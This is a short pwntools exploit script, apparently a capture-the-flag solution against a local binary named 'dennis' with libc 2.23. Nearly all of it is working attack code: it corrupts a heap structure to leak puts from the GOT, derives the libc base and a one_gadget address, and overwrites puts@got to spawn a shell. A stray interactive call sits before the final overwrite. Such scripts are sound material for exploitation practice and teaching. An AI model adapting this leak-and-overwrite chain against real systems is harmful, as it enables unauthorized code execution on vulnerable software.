from pwn import *

libc = ELF('./libc-2.23.so')

e = ELF('./dennis')

# p = process('./dennis')
context.terminal = ['termite', '-e']
p = gdb.debug('./dennis')
p.recvuntil(': ')

# malloc to initialize spm struct on the heap
p.sendline('1')
p.recvuntil(': ')
p.sendline('0')
p.recvuntil(': ')

# write into spm struct
# 
# static struct spm {
#	struct spm *spm;  -> puts@got
#	struct spm *spmm; -> spm symbol
# } *spm;
p.sendline('4')
p.recvuntil(': ')
p.sendline(p32(e.got['puts'])+p32(e.symbols['spm']))
p.recvuntil(': ')

# dereference puts@got by modifying spm symbol to point to puts@got
p.sendline('3')
p.recvuntil(': ')

# read first 4 bytes of spm that points to puts@got to leak puts libc address
p.sendline('2')
p.recvuntil(': ')
p.sendline('4')

puts = u32(p.recv(4))
log.info(hex(puts))

libc_base = puts - libc.symbols['puts']
one_gadget = libc_base + 0x3a61c

p.recvuntil(': ')
p.interactive()

# write one_gadget to puts@got
p.sendline('4')
p.recvuntil(': ')
p.sendline(p32(one_gadget))
p.recvuntil(': ')

# any input to cause a puts call
p.sendline('0wn3d')
p.interactive()